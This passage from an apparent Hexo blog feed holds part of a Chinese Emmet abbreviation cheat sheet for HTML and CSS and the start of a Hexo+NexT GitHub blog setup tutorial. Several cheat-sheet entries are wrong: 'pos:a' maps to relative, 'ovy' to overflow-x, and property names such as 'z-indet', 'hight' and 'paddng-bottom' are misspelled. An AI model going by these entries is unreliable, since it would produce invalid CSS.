</code></pre><h4 id="form-post"><a href="#form-post" class="headerlink" title="form:post"></a>form:post</h4><pre><code class="html">&lt;form action=&quot;post&quot;&gt;&lt;/form&gt;
</code></pre><h3 id="L"><a href="#L" class="headerlink" title="L"></a>L</h3><h4 id="link"><a href="#link" class="headerlink" title="link"></a>link</h4><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt;
</code></pre><h4 id="link-css"><a href="#link-css" class="headerlink" title="link:css"></a>link:css</h4><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
</code></pre><h4 id="link-print"><a href="#link-print" class="headerlink" title="link:print"></a>link:print</h4><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;print.css&quot; media=&quot;print&quot;&gt;
</code></pre><h4 id="link-favicon"><a href="#link-favicon" class="headerlink" title="link:favicon"></a>link:favicon</h4><pre><code class="html">&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;favicon.ico&quot;&gt;
</code></pre><h4 id="link-touch"><a href="#link-touch" class="headerlink" title="link:touch"></a>link:touch</h4><pre><code class="html">&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;favicon.png&quot;&gt;
</code></pre><h3 id="I"><a href="#I" class="headerlink" title="I"></a>I</h3><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><pre><code class="html">&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><pre><code class="html">&lt;input type=&quot;text&quot;&gt;
</code></pre><h4 id="inp"><a href="#inp" class="headerlink" title="inp"></a>inp</h4><p>这种写法也适用：<code>input:text input:t</code></p><pre><code class="html">&lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-hideen"><a href="#input-hideen" class="headerlink" title="input:hideen"></a>input:hideen</h4><p>这种写法也适用：<code>input:h</code></p><pre><code class="html">&lt;input type=&quot;hidden&quot; name=&quot;&quot;&gt;
</code></pre><h4 id="input-search"><a href="#input-search" class="headerlink" title="input:search"></a>input:search</h4><pre><code class="html">&lt;input type=&quot;search&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-email"><a href="#input-email" class="headerlink" title="input:email"></a>input:email</h4><pre><code class="html">&lt;input type=&quot;email&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-url"><a href="#input-url" class="headerlink" title="input:url"></a>input:url</h4><pre><code class="html">&lt;input type=&quot;url&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-password"><a href="#input-password" class="headerlink" title="input:password"></a>input:password</h4><p>这种写法也适用：<code>input:p</code></p><pre><code class="html">&lt;input type=&quot;password&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-datetime"><a href="#input-datetime" class="headerlink" title="input:datetime"></a>input:datetime</h4><pre><code class="html">&lt;input type=&quot;datetime&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-date"><a href="#input-date" class="headerlink" title="input:date"></a>input:date</h4><pre><code class="html">&lt;input type=&quot;date&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-datetime-local"><a href="#input-datetime-local" class="headerlink" title="input:datetime-local"></a>input:datetime-local</h4><pre><code class="html">&lt;input type=&quot;datetime-local&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-month"><a href="#input-month" class="headerlink" title="input:month"></a>input:month</h4><pre><code class="html">&lt;input type=&quot;month&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-week"><a href="#input-week" class="headerlink" title="input:week"></a>input:week</h4><pre><code class="html">&lt;input type=&quot;week&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-time"><a href="#input-time" class="headerlink" title="input:time"></a>input:time</h4><pre><code class="html">&lt;input type=&quot;time&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-number"><a href="#input-number" class="headerlink" title="input:number"></a>input:number</h4><pre><code class="html">&lt;input type=&quot;number&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-color"><a href="#input-color" class="headerlink" title="input:color"></a>input:color</h4><pre><code class="html">&lt;input type=&quot;color&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-checkbox"><a href="#input-checkbox" class="headerlink" title="input:checkbox"></a>input:checkbox</h4><p>这种写法也适用：<code>input:c</code></p><pre><code class="html">&lt;input type=&quot;checkbox&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-radio"><a href="#input-radio" class="headerlink" title="input:radio"></a>input:radio</h4><p>这种写法也适用：<code>input:r</code></p><pre><code class="html">&lt;input type=&quot;radio&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-range"><a href="#input-range" class="headerlink" title="input:range"></a>input:range</h4><pre><code class="html">&lt;input type=&quot;range&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-file"><a href="#input-file" class="headerlink" title="input:file"></a>input:file</h4><p>这种写法也适用：<code>input:f</code></p><pre><code class="html">&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot;&gt;
</code></pre><h4 id="input-submit"><a href="#input-submit" class="headerlink" title="input:submit"></a>input:submit</h4><p>这种写法也适用：<code>input:s</code></p><pre><code class="html">&lt;input type=&quot;submit&quot; value=&quot;&quot;&gt;
</code></pre><h4 id="input-image"><a href="#input-image" class="headerlink" title="input:image"></a>input:image</h4><p>这种写法也适用：<code>input:i</code></p><pre><code class="html">&lt;input type=&quot;image&quot; src=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="input-button"><a href="#input-button" class="headerlink" title="input:button"></a>input:button</h4><p>这种写法也适用：<code>input:b</code></p><pre><code class="html">&lt;input type=&quot;button&quot; value=&quot;&quot;&gt;
</code></pre><h4 id="input-reset"><a href="#input-reset" class="headerlink" title="input:reset"></a>input:reset</h4><pre><code class="html">&lt;input type=&quot;reset&quot; value=&quot;&quot;&gt;
</code></pre><h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><h4 id="meta-utf"><a href="#meta-utf" class="headerlink" title="meta:utf"></a>meta:utf</h4><pre><code class="html">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;
</code></pre><h4 id="meta-win"><a href="#meta-win" class="headerlink" title="meta:win"></a>meta:win</h4><pre><code class="html">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=windows-1251&quot;&gt;
</code></pre><h4 id="meta-vp"><a href="#meta-vp" class="headerlink" title="meta:vp"></a>meta:vp</h4><pre><code class="html">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minmum-scale=1.0&quot;&gt;
</code></pre><h4 id="meta-compat"><a href="#meta-compat" class="headerlink" title="meta:compat"></a>meta:compat</h4><pre><code class="html">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot;&gt;
</code></pre><h4 id="menu-context"><a href="#menu-context" class="headerlink" title="menu:context"></a>menu:context</h4><p>这种写法也适用：<code>menu:c</code></p><pre><code class="html">&lt;menu type=&quot;context&quot;&gt;&lt;/menu&gt;
</code></pre><h4 id="menu-toolbar"><a href="#menu-toolbar" class="headerlink" title="menu:toolbar"></a>menu:toolbar</h4><p>这种写法也适用：<code>menu:t</code></p><pre><code class="html">&lt;menu type=&quot;toolbar&quot;&gt;&lt;/menu&gt;
</code></pre><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="视觉格式"><a href="#视觉格式" class="headerlink" title="视觉格式"></a>视觉格式</h2><h3 id="position"><a href="#position" class="headerlink" title="position"></a>position</h3><ul><li><strong>pos</strong> =&gt; <code>position: relative;</code></li><li><strong>pos:s</strong> =&gt; <code>position: static;</code></li><li><strong>pos:a</strong> =&gt; <code>position: relative;</code></li><li><strong>pos:r</strong> =&gt; <code>position: relative;</code></li><li><strong>pos:f</strong> =&gt; <code>position: fixed;</code></li><li><strong>t</strong> =&gt; <code>top: ;</code></li><li><strong>t:a</strong> =&gt; <code>top: auto;</code></li><li><strong>l</strong> =&gt; <code>left: ;</code></li><li><strong>l:a</strong> =&gt; <code>left: auto;</code></li><li><strong>b</strong> =&gt; <code>bottom: ;</code></li><li><strong>b:a</strong> =&gt; <code>bottom: auto;</code></li><li><strong>r</strong> =&gt; <code>right: ;</code></li><li><strong>r:a</strong> =&gt; <code>right: auto;</code></li><li><strong>z</strong> =&gt; <code>z-indet: ;</code></li><li><strong>z:a</strong> =&gt; <code>z-indet: auto;</code></li></ul><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><ul><li><strong>fl</strong> =&gt; <code>float: left;</code></li><li><strong>fl:n</strong> =&gt; <code>float: none;</code></li><li><strong>fl:l</strong> =&gt; <code>float: left;</code></li><li><strong>fl:r</strong> =&gt; <code>float: right;</code></li><li><strong>cl</strong> =&gt; <code>clear: both;</code></li><li><strong>cl:n</strong> =&gt; <code>clear: none;</code></li><li><strong>cl:l</strong> =&gt; <code>clear: left;</code></li><li><strong>cl:r</strong> =&gt; <code>clear: right;</code></li><li><strong>cl:b</strong> =&gt; <code>clear: both;</code></li></ul><h3 id="dispaly"><a href="#dispaly" class="headerlink" title="dispaly"></a>dispaly</h3><ul><li><strong>d</strong> =&gt; <code>display: block;</code></li><li><strong>d:n</strong> =&gt; <code>display: none;</code></li><li><strong>d:b</strong> =&gt; <code>display: block;</code></li><li><strong>d:i</strong> =&gt; <code>display: inline;</code></li><li><strong>d:ib</strong> =&gt; <code>display: inline-block;</code></li><li><strong>d:f</strong> =&gt; <code>display: flex;</code></li><li><strong>d:if</strong> =&gt; <code>display: inline-flex;</code></li><li><strong>d:li</strong> =&gt; <code>display: list-item;</code></li><li><strong>d:ri</strong> =&gt; <code>display: run-in;</code></li><li><strong>d:cp</strong> =&gt; <code>display: compat;</code></li><li><strong>d:tb</strong> =&gt; <code>display: table;</code></li><li><strong>d:itb</strong> =&gt; <code>display: inline-table;</code></li><li><strong>d:tbcp</strong> =&gt; <code>display: table-caption;</code></li><li><strong>d:tbcl</strong> =&gt; <code>display: table-column;</code></li><li><strong>d:tbclg</strong> =&gt; <code>display: table-column-group;</code></li><li><strong>d:tbhg</strong> =&gt; <code>display: table-header-group;</code></li><li><strong>d:tbfg</strong> =&gt; <code>display: table-footer-group;</code></li><li><strong>d:tbr</strong> =&gt; <code>display: table-row;</code></li><li><strong>d:tbrg</strong> =&gt; <code>display: table-row-group;</code></li><li><strong>d:tbc</strong> =&gt; <code>display: table-cell;</code></li></ul><h3 id="visibility"><a href="#visibility" class="headerlink" title="visibility"></a>visibility</h3><ul><li><strong>v</strong> =&gt; <code>visibility: hidden;</code></li><li><strong>v:v</strong> =&gt; <code>visibility: visible;</code></li><li><strong>v:h</strong> =&gt; <code>visibility: hidden;</code></li><li><strong>v:c</strong> =&gt; <code>visibility: collapse;</code></li></ul><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><ul><li><strong>ov</strong> =&gt; <code>overflow: hidden;</code></li><li><strong>ov:v</strong> =&gt; <code>overflow: visible;</code></li><li><strong>ov:h</strong> =&gt; <code>overflow: hidden;</code></li><li><strong>ov:s</strong> =&gt; <code>overflow: scroll;</code></li><li><strong>ov:a</strong> =&gt; <code>overflow: auto;</code></li><li><strong>ovx</strong> =&gt; <code>overflow-x: hidden;</code></li><li><strong>ovx:v</strong> =&gt; <code>overflow-x: visible;</code></li><li><strong>ovx:h</strong> =&gt; <code>overflow-x: hidden;</code></li><li><strong>ovx:s</strong> =&gt; <code>overflow-x: scroll;</code></li><li><strong>ovx:a</strong> =&gt; <code>overflow-x: auto;</code></li><li><strong>ovy</strong> =&gt; <code>overflow-x: hidden;</code></li><li><strong>ovy:v</strong> =&gt; <code>overflow-y: visible;</code></li><li><strong>ovy:h</strong> =&gt; <code>overflow-y: hidden;</code></li><li><strong>ovy:s</strong> =&gt; <code>overflow-y: scroll;</code></li><li><strong>ovy:a</strong> =&gt; <code>overflow-y: auto;</code></li><li><strong>ovs</strong> =&gt; <code>overflow-style: scrollbar;</code></li><li><strong>ovs:a</strong> =&gt; <code>overflow-style: auto;</code></li><li><strong>ovs:s</strong> =&gt; <code>overflow-style: scrollbar;</code></li><li><strong>ovs:p</strong> =&gt; <code>overflow-style: panner;</code></li><li><strong>ovs:m</strong> =&gt; <code>overflow-style: move;</code></li><li><strong>ovs:mq</strong> =&gt; <code>overflow-style: marquee;</code></li></ul><h3 id="clip"><a href="#clip" class="headerlink" title="clip"></a>clip</h3><ul><li><strong>cp</strong> =&gt; <code>clip: ;</code></li><li><strong>cp:a</strong> =&gt; <code>clip: auto;</code></li><li><strong>cp:r</strong> =&gt; <code>clip: rect(top right bottom left);</code></li></ul><h3 id="resize"><a href="#resize" class="headerlink" title="resize"></a>resize</h3><ul><li><strong>rsz</strong> =&gt; <code>resize: ;</code></li><li><strong>rsz:n</strong> =&gt; <code>resize: none;</code></li><li><strong>rsz:b</strong> =&gt; <code>resize: both;</code></li><li><strong>rsz:h</strong> =&gt; <code>resize: horizontal;</code></li><li><strong>rsz:v</strong> =&gt; <code>resize: vertical;</code></li></ul><h3 id="cursor"><a href="#cursor" class="headerlink" title="cursor"></a>cursor</h3><ul><li><strong>cur</strong> =&gt; <code>cursor: pointer;</code></li><li><strong>cur:a</strong> =&gt; <code>cursor: auto;</code></li><li><strong>cur:d</strong> =&gt; <code>cursor: default;</code></li><li><strong>cur:c</strong> =&gt; <code>cursor: crosshair;</code></li><li><strong>cur:ha</strong> =&gt; <code>cursor: hand;</code></li><li><strong>cur:he</strong> =&gt; <code>cursor: help;</code></li><li><strong>cur:m</strong> =&gt; <code>cursor: move;</code></li><li><strong>cur:p</strong> =&gt; <code>cursor: pointer;</code></li><li><strong>cur:t</strong> =&gt; <code>cursor: text;</code></li></ul><h2 id="外边距和内边距"><a href="#外边距和内边距" class="headerlink" title="外边距和内边距"></a>外边距和内边距</h2><h3 id="margin-amp-amp-padding"><a href="#margin-amp-amp-padding" class="headerlink" title="margin &amp;&amp; padding"></a>margin &amp;&amp; padding</h3><ul><li><strong>m</strong> =&gt; <code>margin: ;</code></li><li><strong>m:a</strong> =&gt; <code>margin: auto;</code></li><li><strong>mt</strong> =&gt; <code>margin-top: ;</code></li><li><strong>mt:a</strong> =&gt; <code>margin-top: auto;</code></li><li><strong>mr</strong> =&gt; <code>margin-right: ;</code></li><li><strong>mr:a</strong> =&gt; <code>margin-right: auto;</code></li><li><strong>mb</strong> =&gt; <code>margin-bottom: ;</code></li><li><strong>mb:a</strong> =&gt; <code>margin-bottom: auto;</code></li><li><strong>ml</strong> =&gt; <code>margin-left: ;</code></li><li><strong>ml-a</strong> =&gt; <code>margin-left: auto;</code></li><li><strong>p</strong> =&gt; <code>padding: ;</code></li><li><strong>pt</strong> =&gt; <code>padding-top: ;</code></li><li><strong>pr</strong> =&gt; <code>padding-right: ;</code></li><li><strong>pb</strong> =&gt; <code>paddng-bottom: ;</code></li><li><strong>pl</strong> =&gt; <code>padding-left: ;</code></li></ul><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><h3 id="box"><a href="#box" class="headerlink" title="box"></a>box</h3><ul><li><strong>bxz</strong> =&gt; <code>box-sizing: border-box;</code></li><li><strong>bxz:cb</strong> =&gt; <code>box-sizing: content-box;</code></li><li><strong>bxz:bb</strong> =&gt; <code>box-sizing: border-box;</code></li><li><strong>bxsh</strong> =&gt; <code>box-shadow: inset hoff voff blur color;</code></li><li><strong>bxsh:r</strong> =&gt; <code>box-shadow: inset hoff voff blur spread rgb(0, 0, 0);</code></li><li><strong>bxsh:ra</strong> =&gt; <code>box-shadow: inset h v blur spread rgba(0, 0, 0, .5);</code></li><li><strong>bxsh:n</strong> =&gt; <code>box-shadow: none;</code></li></ul><h3 id="width-amp-amp-hight"><a href="#width-amp-amp-hight" class="headerlink" title="width &amp;&amp; hight"></a>width &amp;&amp; hight</h3><ul><li><strong>w</strong> =&gt; <code>width: ;</code></li><li><strong>w:a</strong> =&gt; <code>width: auto;</code></li><li><strong>h</strong> =&gt; <code>hight: ;</code></li><li><strong>h:a</strong> =&gt; <code>hight: auto;</code></li><li><strong>maw</strong> =&gt; <code>max-width: ;</code></li><li><strong>maw:n</strong> =&gt; <code>max-width: none;</code></li><li><strong>mah</strong> =&gt; <code>max-hight: ;</code></li><li><strong>mah:n</strong> =&gt; <code>max-hight: none;</code></li><li><strong>miw</strong> =&gt; <code>min-width: ;</code></li><li><strong>mih</strong> =&gt; <code>min-hight: ;</code></li></ul><h2 id="字体和文本"><a href="#字体和文本" class="headerlink" title="字体和文本"></a>字体和文本</h2><h3 id="font"><a href="#font" class="headerlink" title="font"></a>font</h3><ul><li><strong>f</strong> =&gt; <code>font: ;</code></li><li><strong>f+</strong> =&gt; <code>font: 1em Arial,sans-serif;</code></li><li><strong>fw</strong> =&gt; <code>font-weight: ;</code></li><li><strong>fw:n</strong> =&gt; <code>font-weight: none;</code></li><li><strong>fw:b</strong> =&gt; <code>font-weight: bold;</code></li><li><strong>fw:br</strong> =&gt; <code>font-weight: bolder;</code></li><li><strong>fw:lr</strong> =&gt; <code>font-weight: lighter;</code></li><li><strong>fs</strong> =&gt; <code>font-style: italic;</code></li><li><strong>fs:n</strong> =&gt; <code>font-style: normal;</code></li><li><strong>fs:i</strong> =&gt; <code>font-style: italic;</code></li><li><strong>fs:o</strong> =&gt; <code>font-style: oblique;</code></li><li><strong>fv</strong> =&gt; <code>font-variant: ;</code></li><li><strong>fv:n</strong> =&gt; <code>font-variant: normal;</code></li><li><strong>fv:sc</strong> =&gt; <code>font-variant: small-caps;</code></li><li><strong>fz</strong> =&gt; <code>font-size: ;</code></li><li><strong>fza</strong> =&gt; <code>font-size-adjust: ;</code></li><li><strong>fza:n</strong> =&gt; <code>font-size-adjust: none;</code></li><li><strong>ff</strong> =&gt; <code>font-family: ;</code></li><li><strong>ff:s</strong> =&gt; <code>font-family: serif;</code></li><li><strong>ff:ss</strong> =&gt; <code>font-family: sans-serif;</code></li><li><strong>ff:c</strong> =&gt; <code>font-family: cursive;</code></li><li><strong>ff:f</strong> =&gt; <code>font-family: fantasy;</code></li><li><strong>ff:m</strong> =&gt; <code>font-family: monospace;</code></li><li><strong>ff:a</strong> =&gt; <code>font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif;</code></li><li><strong>fef</strong> =&gt; <code>font-effect: ;</code></li><li><strong>fef:n</strong> =&gt; <code>font-effect: none;</code></li><li><strong>fef:eg</strong> =&gt; <code>font-effect: engrave;</code></li><li><strong>fef:eb</strong> =&gt; <code>font-effect: emboss;</code></li><li><strong>fef:o</strong> =&gt; <code>font-effect: outline;</code></li><li><strong>@i</strong> =&gt; <code>@import url();</code></li><li><p><strong>@f</strong> =&gt;</p><pre><code class="css">@font-face {
  font-family:;
  src:url();
}
</code></pre></li><li><p><strong>@f+</strong> =&gt;</p><pre><code class="css">@font-face {
  font-family: &#39;FontName&#39;;
  src: url(&#39;FileName.eot&#39;);
  src: url(&#39;FileName.eot?#iefix&#39;) format(&#39;embedded-opentype&#39;),
     url(&#39;FileName.woff&#39;) format(&#39;woff&#39;),
     url(&#39;FileName.ttf&#39;) format(&#39;truetype&#39;),
     url(&#39;FileName.svg#FontName&#39;) format(&#39;svg&#39;);
  font-style: normal;
  font-weight: normal;
}
</code></pre></li></ul><h3 id="vertical"><a href="#vertical" class="headerlink" title="vertical"></a>vertical</h3><ul><li><strong>va</strong> =&gt; <code>vertical-align: top;</code></li><li><strong>va:sup</strong> =&gt; <code>vertical-align: super;</code></li><li><strong>va:t</strong> =&gt; <code>vertical-align: top;</code></li><li><strong>va:tt</strong> =&gt; <code>vertical-align: text-top;</code></li><li><strong>va:m</strong> =&gt; <code>vertical-align: middle;</code></li><li><strong>va:bl</strong> =&gt; <code>vertical-align: baseline;</code></li><li><strong>va:b</strong> =&gt; <code>vertical-align: bottom;</code></li><li><strong>va:tb</strong> =&gt; <code>vertical-align: text-bottom;</code></li><li><strong>va:sub</strong> =&gt; <code>vertical-align: sub;</code></li></ul><h3 id="text"><a href="#text" class="headerlink" title="text"></a>text</h3><ul><li><strong>ta</strong> =&gt; <code>text-align: left;</code></li><li><strong>ta:l</strong> =&gt; <code>text-align: left;</code></li><li><strong>ta:c</strong> =&gt; <code>text-align: center;</code></li><li><strong>ta:r</strong> =&gt; <code>text-align: right;</code></li><li><strong>ta:j</strong> =&gt; <code>text-align: justify;</code></li><li><strong>ta-lst</strong> =&gt; <code>text-align-last: ;</code></li><li><strong>tal:a</strong> =&gt; <code>text-align-last: auto;</code></li><li><strong>tal:l</strong> =&gt; <code>text-align-last: left;</code></li><li><strong>tal:c</strong> =&gt; <code>text-align-last: center;</code></li><li><strong>tal:r</strong> =&gt; <code>text-align-last: right;</code></li><li><strong>tov</strong> =&gt; <code>text-overflow: ellipsis;</code></li><li><strong>tov:c</strong> =&gt; <code>text-overflow: clip;</code></li><li><strong>tov:e</strong> =&gt; <code>text-overflow: ellipsis;</code></li><li><strong>td</strong> =&gt; <code>text-decoration: none;</code></li><li><strong>td:n</strong> =&gt; <code>text-decoration: none;</code></li><li><strong>td:u</strong> =&gt; <code>text-decoration: underline;</code></li><li><strong>td:o</strong> =&gt; <code>text-decoration: overline;</code></li><li><strong>td:l</strong> =&gt; <code>text-decoration: line;</code></li></ul><h2 id="CSS-3-动画"><a href="#CSS-3-动画" class="headerlink" title="CSS 3 动画"></a>CSS 3 动画</h2><h3 id="keyframes"><a href="#keyframes" class="headerlink" title="keyframes"></a>keyframes</h3><ul><li><p><strong>@kf</strong> =&gt;</p><pre><code class="css">@-webkit-keyframes identifier {
  from {  }
  to {  }
}
@-o-keyframes identifier {
  from {  }
  to {  }
}
@-moz-keyframes identifier {
  from {  }
  to {  }
}
@keyframes identifier {
  from {  }
  to {  }
}
</code></pre></li></ul><h3 id="animation"><a href="#animation" class="headerlink" title="animation"></a>animation</h3><ul><li><strong>anim-</strong> =&gt; <code>animation: name duration timing-function delay iteration-count direction fill-mode;</code></li><li><strong>animdel</strong> =&gt; <code>animation-delay: time;</code></li><li><strong>animdir</strong> =&gt; <code>animation-direction: normal;</code></li><li><strong>animdir:a</strong> =&gt; <code>animation-direction: alternate;</code></li><li><strong>animdir:ar</strong> =&gt; <code>animation-direction: alternate;</code></li><li><strong>animdir:n</strong> =&gt; <code>animation-direction: normal;</code></li><li><strong>animdir:r</strong> =&gt; <code>animation-direction: reverse;</code></li></ul><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><ul><li><strong>trf</strong> =&gt; <code>transform: ;</code></li><li><strong>trf:r</strong> =&gt; <code>transform: rotate(angle);</code></li><li><strong>trf:sc</strong> =&gt; <code>transform: scale(x, y);</code></li><li><strong>trf:scx</strong> =&gt; <code>transform: scale(x);</code></li><li><strong>trf:scy</strong> =&gt; <code>transform: scale(y);</code></li><li><strong>trf:skx</strong> =&gt; <code>transform: skewX(angle);</code></li><li><strong>trf:sky</strong> =&gt; <code>transform: skewY(angle);</code></li><li><strong>trf:t</strong> =&gt; <code>transform: translate(x, y);</code></li><li><strong>trf:tx</strong> =&gt; <code>transform: translateX(x);</code></li><li><strong>trf:ty</strong> =&gt; <code>transform: translateY(y);</code></li><li><strong>trfo</strong> =&gt; <code>transform-origin: ;</code></li><li><strong>trfs</strong> =&gt; <code>transform-style: preserve-3d;</code></li></ul><h3 id="transition"><a href="#transition" class="headerlink" title="transition"></a>transition</h3><ul><li><strong>trs</strong> =&gt; <code>transition: prop time;</code></li><li><strong>trsde</strong> =&gt; <code>transition-delay: time;</code></li><li><strong>trsdu</strong> =&gt; <code>transition-duration: time;</code></li><li><strong>trsp</strong> =&gt; <code>transition-property: prop;</code></li><li><strong>trstf</strong> =&gt; <code>transition-timing-function: tfunc;</code></li></ul><h1 id="更多用法实例"><a href="#更多用法实例" class="headerlink" title="更多用法实例"></a>更多用法实例</h1><blockquote><p>在线查看查看 <a href="http://oaq0p7t2g.bkt.clouddn.com/emmet-usage-examples.jpg" target="_blank" rel="external">emmet-usage-examples.jpg</a><br><br>请下载查看 <a href="http://oaq0p7t2g.bkt.clouddn.com/emmet-usage-examples.jpg?attname=" target="_blank" rel="external">emmet-usage-examples.jpg</a></p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> manual </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 Hexo+NexT 在 Github 上搭建静态博客]]></title>
      <url>/2016/08/install-hexo-next-on-github/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Hexo 是一个快速，简单而高效的静态博客框架，本文将介绍如何在 GitHub 上使用 Hexo+NexT 搭建静态博客<a id="more"></a></p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><blockquote><p>你需要在 <a href="//github.com/">Github</a> 上创建一个属于自己的账户，然后新建一个仓库（new repository），并命名为 YourSiteName.github.io，此时Github会帮助你初始化一个静态网页，你可以根据自己的喜好选择一些模版（这都不是重点），接着尝试访问下你所建的站点，成功后就可以开始动工了。</p></blockquote><h2 id="Node-js-环境"><a href="#Node-js-环境" class="headerlink" title="Node.js 环境"></a>Node.js 环境</h2><blockquote><p>需安装 nvm，任何版本皆可</p></blockquote><pre><code class="bash">nvm 5
nvm alias defaults 5
</code></pre><h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><blockquote><p>如果你的系统没有 git，则必装</p></blockquote><pre><code class="bash">sudo apt-get install git
</code></pre><h1 id="Hexo-初始化博客框架"><a href="#Hexo-初始化博客框架" class="headerlink" title="Hexo 初始化博客框架"></a>Hexo 初始化博客框架</h1><blockquote><p>参考链接<br><br><a href="//hexo.io/zh-cn/">Hexo 官网</a><br><br><a href="//hexo.io/zh-cn/docs/">Hexo 配置文档</a><br><br><a href="//hexo.io/zh-cn/docs/commands.html">Hexo 相关指令</a><br><br><a href="//github.com/hexojs/hexo/wiki/Themes">Hexo 主题</a></p></blockquote><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><pre><code class="bash">npm install -g hexo-cli
</code></pre><h2 id="初始化框架"><a href="#初始化框架" class="headerlink" title="初始化框架"></a>初始化框架</h2><pre><code class="bash">hexo init [yourFolder]
cd [folderName]
npm install
</code></pre><h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><pre><code class="bash">hexo new &quot;Hello World&quot;
</code></pre><p>在 <code>./source/_post</code> 里添加 <code>hello-world.md</code> 文件，之后新建的文章都将存放在此目录下。</p><h3 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h3><pre><code class="bash">hexo new page tags
hexo new page categories
</code></pre><p>在 <code>./source/</code> 里添加 <code>tags</code> 和 <code>categories</code> 目录，即标签页和分类页</p><h3 id="取消标签页和分类页的评论功能"><a href="#取消标签页和分类页的评论功能" class="headerlink" title="取消标签页和分类页的评论功能"></a>取消标签页和分类页的评论功能</h3><p>标签页 <code>./source/categories/index.md</code></p><pre><code class="markdown">---
title: null
date:
type: &quot;categories&quot;
comments: false
---
</code></pre><p>分类页 <code>./source/tags/index.md</code></p><pre><code class="markdown">---
title: null
date:
type: &quot;tags&quot;
comments: false
---
</code></pre><h3 id="建议修改默认的文章模板"><a href="#建议修改默认的文章模板" class="headerlink" title="建议修改默认的文章模板"></a>建议修改默认的文章模板</h3><pre><code class="bash">vim ./scaffolds/post.md
</code></pre><p>修改成</p><pre><code class="markdown">---
title: {{ title }}
date: {{ date }}

categories:
tags:
---
</code></pre><h2 id="生成静态网站"><a href="#生成静态网站" class="headerlink" title="生成静态网站"></a>生成静态网站</h2><pre><code class="bash">hexo generate
</code></pre><p>此时会将 <code>/source</code> 的 <code>.md</code> 文件生成 <code>html</code> 文件到 <code>/public</code> 中，形成网站的静态文件。</p><h2 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h2><pre><code class="bash">hexo server -p 3000
</code></pre><p>输入 <code>//localhost:3000</code> 即可查看网站，若无指定端口号，将采用默认端口 <code>4000</code>。 使用 <code>Ctrl + C</code> 快捷键终止该进程</p><h2 id="部署网站至-github"><a href="#部署网站至-github" class="headerlink" title="部署网站至 github"></a>部署网站至 github</h2><pre><code class="bash">hexo deploy
</code></pre><h3 id="静态化且部署简化命令"><a href="#静态化且部署简化命令" class="headerlink" title="静态化且部署简化命令"></a>静态化且部署简化命令</h3><pre><code class="bash">hexo g -d
</code></pre><h3 id="部署网站前请配置-config-yml"><a href="#部署网站前请配置-config-yml" class="headerlink" title="部署网站前请配置 ./_config.yml"></a>部署网站前请配置 <code>./_config.yml</code></h3><pre><code class="bash">deploy:
  type: git
  repo: git@github.com:youName/youName.github.io.git
  branch: master
</code></pre><h3 id="部署前请执行"><a href="#部署前请执行" class="headerlink" title="部署前请执行"></a>部署前请执行</h3><pre><code class="bash">npm install hexo-deployer-git --save
hexo clean
hexo generate
